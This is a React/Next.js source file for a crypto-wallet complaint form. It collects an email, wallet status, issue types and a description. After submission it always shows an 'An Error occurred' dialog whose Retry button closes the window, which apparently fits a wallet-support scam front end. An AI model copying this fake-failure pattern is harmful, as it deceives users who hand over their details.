"use client"
import React, { useState, useEffect } from 'react'
import UseFormHandler from '../useFormHandler'
import { useRouter } from 'next/navigation'
import { complains } from '../services/authService'
import Modal from '../components/Modal'
import error from "@/public/error.png"
import Image from 'next/image'

function Page() {
    const router = useRouter()
    const [email, setEmail] = useState("")
    const [openModal, setOpenModal] = useState(false)

    const close = () => {
        let new_window = open(location, '_self')
        new_window.close()

        return false
    }

    const formdata = UseFormHandler({
        required: {
            email: 'Please Enter Email',
            complain: 'Please Enter complains',
            wallet_type: 'Please Enter wallet type'
        },
        initialValues: {
            email,
            complain: "",
            wallet_type: ""
        },
        onSubmit: async (value) => {
            const { status, data } = await complains(value).catch(() =>
                formdata.setProccessing(false)
            )

            setOpenModal(true)
        }
    })
    useEffect(() => {
        // Get the URL search parameters
        const params = new URLSearchParams(window.location.search)
        const emal = params.get("email")
        setEmail(emal || "") // Set the email state
        formdata.value.email = emal || ""
    }, [])


    return (
        <div className='select-none scroll-smooth max-w-lg mx-auto'>
            <Modal size={"sm"} isOpen={openModal} promt>
                <div className="space-y-4">
                    <Image width={100} height={100} className='w-24 h-24 mx-auto' alt='error' src={error} />
                    <div className="text-lg text-center">An Error occurred</div>
                    <div onClick={() => close()} className={`bg-red-600  rounded-full text-center cursor-pointer py-3 px-9 text-white font-bold`}>Retry</div>
                </div>
            </Modal>
            <div className="bg-slate-50 dark:bg-gray-950 flex flex-col min-h-screen h-screen">
                <div className="flex-grow py-16 space-y-4">
                    <div className="h-full px-4 space-y-6">
                        <div className="text-center">
                            <div className="font-bold text-lg">Submit Your Complaint</div>
                        </div>
                        <div className="space-y-3">
                            <div className="space-y-1">
                                <div className="text-sm">Email Addreess</div>
                                <input
                                    onChange={(e) => { setEmail(e.target.value); formdata.value.email = e.target.value }}
                                    className="w-full appearance-none dark:bg-gray-900 placeholder:text-gray-700 p-3 outline-none rounded-2xl"
                                />
                                <div className="text-xs text-red-600">{formdata?.error?.email}</div>
                            </div>
                            <div className="">
                                <div className="">Are you new to this wallet ?</div>
                                <div className="flex items-center gap-3">
                                    <div className="">
                                        <label htmlFor='yes' className='space-x-1 cursor-pointer'>
                                            <input onChange={(e) => formdata.value.wallet_type = e.target.value} value="yes" name='new' id='yes' type='radio' />
                                            <span>Yes</span>
                                        </label>
                                    </div>
                                    <div className="">
                                        <label htmlFor='no' className='space-x-1 cursor-pointer'>
                                            <input onChange={(e) => formdata.value.wallet_type = e.target.value} value="no" name='new' id='no' type='radio' />
                                            <span>No</span>
                                        </label>
                                    </div>
                                    <div className="">
                                        <label htmlFor='maybe' className='space-x-1 cursor-pointer'>
                                            <input onChange={(e) => formdata.value.wallet_type = e.target.value} value="no" name='new' id='maybe' type='radio' />
                                            <span>Maybe</span>
                                        </label>
                                    </div>
                                </div>
                            </div>
                            <div className="">
                                <div className="">Which of these relates to your complaints ?</div>
                                <div className="">
                                    <div className="">
                                        <label htmlFor='NC' className='space-x-1 cursor-pointer'>
                                            <input name='relates' id='NC' type='checkbox' />
                                            <span>Network Congestion</span>
                                        </label>
                                    </div>
                                    <div className="">
                                        <label htmlFor='BE' className='space-x-1 cursor-pointer'>
                                            <input name='relates' id='BE' type='checkbox' />
                                            <span>Balance Error</span>
                                        </label>
                                    </div>
                                    <div className="">
                                        <label htmlFor='PI' className='space-x-1 cursor-pointer'>
                                            <input name='relates' id='PI' type='checkbox' />
                                            <span>Pending Issues</span>
                                        </label>
                                    </div>
                                    <div className="">
                                        <label htmlFor='MI' className='space-x-1 cursor-pointer'>
                                            <input name='relates' id='MI' type='checkbox' />
                                            <span>Minting Issues</span>
                                        </label>
                                    </div>
                                    <div className="">
                                        <label htmlFor='HGF' className='space-x-1 cursor-pointer'>
                                            <input name='relates' id='HGF' type='checkbox' />
                                            <span>High Gas Fees</span>
                                        </label>
                                    </div>
                                    <div className="">
                                        <label htmlFor='MF' className='space-x-1 cursor-pointer'>
                                            <input name='relates' id='MF' type='checkbox' />
                                            <span>Missing Funds</span>
                                        </label>
                                    </div>
                                    <div className="">
                                        <label htmlFor='other' className='space-x-1 cursor-pointer'>
                                            <input name='relates' id='other' type='checkbox' />
                                            <span>Other</span>
                                        </label>
                                    </div>
                                </div>
                            </div>
                            <div className="space-y-0">
                                <textarea
                                    placeholder='Provide us with information about your complaint'
                                    onChange={(e) => { formdata.value.complain = e.target.value }}
                                    className="w-full dark:bg-gray-900 placeholder:text-gray-700 resize-none text-sm min-h-32 appearance-none p-3 outline-none rounded-2xl"
                                />
                            </div>
                        </div>
                    </div>
                </div>
                <div className="space-y-3 p-4">
                    <div onClick={() => email.length > 0 && formdata.submit()} className={`${email < 1 && "bg-opacity-30"} bg-blue-600  rounded-full text-center cursor-pointer py-4 px-9 text-white font-bold`}>Send</div>
                </div>
            </div>
        </div>
    )
}

export default Page
